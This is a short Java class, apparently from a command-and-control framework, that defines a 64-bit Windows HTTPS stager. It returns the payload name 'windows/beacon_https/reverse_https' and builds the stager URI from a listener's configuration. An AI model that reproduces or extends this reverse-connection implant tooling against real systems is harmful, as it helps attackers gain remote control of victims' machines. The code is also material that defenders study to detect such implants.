package stagers;

import common.Listener;

public class BeaconHTTPSStagerX64
        extends GenericHTTPSStagerX64 {
    public BeaconHTTPSStagerX64(Listener l) {
        super(l);
    }

    @Override
    public String payload() {
        return "windows/beacon_https/reverse_https";
    }

    @Override
    public String getURI() {
        return this.getConfig().getURI_X64() + this.getConfig().getQueryString();
    }
}

